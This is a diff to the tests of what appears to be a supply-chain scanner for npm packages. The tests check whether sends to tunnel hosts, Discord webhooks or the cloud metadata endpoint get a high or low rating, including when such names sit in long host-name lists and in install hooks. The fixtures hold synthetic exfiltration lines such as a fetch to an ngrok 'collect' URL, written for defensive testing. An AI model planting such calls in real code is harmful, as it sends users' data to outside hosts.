@@ -5,7 +5,7 @@ import test from 'node:test';
 import assert from 'node:assert/strict';
 import { npmSnapshot } from '../src/snapshot.js';
 import { diffSnapshots } from '../src/diff.js';
-import { NAME_LIST_MIN, TRANSFORM_LIMIT, scanJs } from '../src/js-scan.js';
+import { NAME_LIST_MIN, TRANSFORM_LIMIT, isHostName, scanJs } from '../src/js-scan.js';
 
 const pkg = (extra = {}) => Buffer.from(JSON.stringify({ name: 't', version: '1.0.0', main: 'index.js', ...extra }));
 const files = (entries, extra) => new Map([['package.json', pkg(extra)], ['index.js', Buffer.from('module.exports = 1;')], ...entries.map(([p, s]) => [p, Buffer.from(s)])]);
@@ -94,6 +94,99 @@ test('a long array that is mostly not strings is not a list of names', async () 
     const mixed = `module.exports = [${[...Array(NAME_LIST_MIN)].map((_, i) => (i % 2 ? `${i}` : `'s${i}'`)).join(', ')}, 'ngrok.io'];\n`;
     const r = await diff([['lib/m.js', 'module.exports = [];\n']], [['lib/m.js', mixed]]);
     assert.equal(sec(r, 'exfil-endpoint')[0].severity, 'high');
+});
+
+// More list entries than the report keeps as locations (50), so an ordinary use comes after the cap.
+const repeated = (hits) => `const names = [${[...Array(NAME_LIST_MIN + hits)].map((_, i) => `'${i < hits ? 'ngrok.io' : `site${i}.example`}'`).join(', ')}];\n`;
+const use = "fetch('https://abc.ngrok.io/collect');\n";
+
+test('an ordinary use after the reported locations still keeps the name high, in the same file or another', async () => {
+    for (const hits of [1, 49, 50, 60]) {
+        const r = await diff([['lib/a.js', 'module.exports = [];\n']], [['lib/a.js', repeated(hits) + use]]);
+        const ex = sec(r, 'exfil-endpoint');
+        assert.equal(ex.length, 1, JSON.stringify(r.findings));
+        assert.equal(ex[0].severity, 'high', `${hits} list hits`);
+        assert.doesNotMatch(ex[0].title, /long list/);
+        assert.equal(r.verdict, 'review');
+    }
+    const cross = await diff([['lib/names.js', 'module.exports = [];\n']], [['lib/names.js', repeated(60)], ['lib/use.js', use]]);
+    assert.equal(sec(cross, 'exfil-endpoint')[0].severity, 'high', JSON.stringify(cross.findings));
+    assert.equal(cross.verdict, 'review');
+});
+
+test('per-file path: a name new to a changed file stays high when any file uses it outside a list', async () => {
+    // Already used in lib/existing.js; lib/a.js gains 60 list entries and an ordinary use after them.
+    const r = await diff([['lib/a.js', 'module.exports = [];\n'], ['lib/existing.js', use]], [['lib/a.js', repeated(60) + use], ['lib/existing.js', use]]);
+    const ex = sec(r, 'exfil-endpoint');
+    assert.equal(ex.length, 1, JSON.stringify(r.findings));
+    assert.match(ex[0].title, /^New in `?lib\/a\.js/);
+    assert.equal(ex[0].severity, 'high');
+    // lib/a.js gains only list entries, but the unchanged lib/existing.js still sends to the name.
+    const listOnlyHere = await diff([['lib/a.js', 'module.exports = [];\n'], ['lib/existing.js', use]], [['lib/a.js', repeated(60)], ['lib/existing.js', use]]);
+    assert.equal(sec(listOnlyHere, 'exfil-endpoint')[0].severity, 'high', JSON.stringify(listOnlyHere.findings));
+});
+
+test('per-file path: a suffix list already in the old version does not excuse a new ordinary use elsewhere', async () => {
+    // The shape of a compromised happy-dom: the list was already there, a changed file now sends to a tunnel.
+    const r = await diff([['lib/psl.js', names(NAME_LIST_MIN, ['ngrok.io'])], ['lib/send.js', 'module.exports = 1;\n']],
+        [['lib/psl.js', names(NAME_LIST_MIN, ['ngrok.io'])], ['lib/send.js', use]]);
+    const ex = sec(r, 'exfil-endpoint');
+    assert.equal(ex.length, 1, JSON.stringify(r.findings));
+    assert.match(ex[0].title, /^New in `?lib\/send\.js/);
+    assert.equal(ex[0].severity, 'high');
+    assert.equal(r.verdict, 'review');
+});
+
+test('per-file path: a suffix list in a changed file that only gains list entries stays low', async () => {
+    const r = await diff([['lib/psl.js', names(NAME_LIST_MIN, ['ngrok.io'])], ['lib/other.js', names(NAME_LIST_MIN, [])]],
+        [['lib/psl.js', names(NAME_LIST_MIN, ['ngrok.io'])], ['lib/other.js', names(NAME_LIST_MIN, ['ngrok.io'])]]);
+    const ex = sec(r, 'exfil-endpoint');
+    assert.equal(ex.length, 1, JSON.stringify(r.findings));
+    assert.match(ex[0].title, /^New in `?lib\/other\.js.*\(only as an entry in a long list of names\)$/);
+    assert.equal(ex[0].severity, 'low');
+});
+
+test('install-time code keeps the name high however many list entries come first', async () => {
+    const install = { scripts: { postinstall: 'node lib/a.js' } };
+    for (const hits of [49, 50, 60]) {
+        const r = await diff([['lib/a.js', 'module.exports = [];\n']], [['lib/a.js', repeated(hits)]], install);
+        assert.ok(r.findings.some((f) => f.kind === 'exfil-endpoint' && f.severity === 'high'), `${hits}: ${JSON.stringify(r.findings)}`);
+        assert.equal(r.verdict, 'review');
+    }
+});
+
+test('a full endpoint URL in a long list is an address, not a name: it stays high', async () => {
+    // A list of endpoints the existing code already posts to; only one entry changes.
+    const urls = (u) => `const endpoints = [${[...Array(NAME_LIST_MIN)].map((_, i) => JSON.stringify(i ? `https://site${i}.example/` : u)).join(', ')}];\nexport function send(body) { return fetch(endpoints[0], { method: 'POST', body }); }\n`;
+    for (const u of ['https://discord.com/api/webhooks/000/synthetic', 'https://metadata.google.internal/computeMetadata/v1/', 'https://abc.ngrok.io/collect', 'https://abc.ngrok.io', 'abc.ngrok.io/collect', 'user@ngrok.io', 'ngrok.io:443']) {
+        const r = await diff([['index.js', urls('https://service.example/submit')]], [['index.js', urls(u)]]);
+        const ex = sec(r, 'exfil-endpoint');
+        assert.equal(ex.length, 1, `${u}: ${JSON.stringify(r.findings)}`);
+        assert.equal(ex[0].severity, 'high', u);
+        assert.doesNotMatch(ex[0].title, /long list/);
+        assert.equal(r.verdict, 'review', u);
+        assert.equal(r.coverage.complete, true);
+    }
+    // One URL among 100 bare names: the names are a list, the URL is still an address.
+    const mixed = await diff([['lib/a.js', names(NAME_LIST_MIN + 1, [])]], [['lib/a.js', names(NAME_LIST_MIN + 1, ['https://abc.ngrok.io/collect'])]]);
+    assert.equal(sec(mixed, 'exfil-endpoint')[0].severity, 'high', JSON.stringify(mixed.findings));
+    // A bare name among 100 URLs: a list of addresses is not a list of names.
+    const among = await diff([['index.js', urls('https://service.example/submit')]], [['index.js', urls('https://service.example/submit').replace("'https://site1.example/'", "'ngrok.io'").replace('"https://site1.example/"', '"ngrok.io"')]]);
+    assert.equal(sec(among, 'exfil-endpoint')[0].severity, 'high', JSON.stringify(among.findings));
+});
+
+test('a public suffix list with wildcard and exception rules is a list of names', async () => {
+    const rules = ['*.ck', '!www.ck', 'xn--p1ai', 'ngrok.io', 'trycloudflare.com'];
+    const r = await diff([['lib/psl.js', names(NAME_LIST_MIN + 5, [])]], [['lib/psl.js', names(NAME_LIST_MIN + 5, rules)]]);
+    const ex = sec(r, 'exfil-endpoint');
+    assert.equal(ex.length, 2, JSON.stringify(r.findings));
+    for (const f of ex) assert.equal(f.severity, 'low');
+    assert.notEqual(r.verdict, 'review');
+});
+
+test('only bare host names are list entries', () => {
+    for (const s of ['ngrok.io', '*.ck', '!www.ck', 'xn--p1ai', 'metadata.google.internal', 'example.com.']) assert.equal(isHostName(s), true, s);
+    for (const s of ['https://abc.ngrok.io/collect', 'https://ngrok.io', '//ngrok.io', 'abc.ngrok.io/x', 'discord.com/api/webhooks', 'user@ngrok.io', 'ngrok.io:443', '169.254.169.254', 'a b.io', '.io', 'a..io', '-a.io', '']) assert.equal(isHostName(s), false, s);
 });
 
 // A platform package (@rollup/rollup-linux-x64-gnu) ships one native addon; added to a lockfile, it read "review".
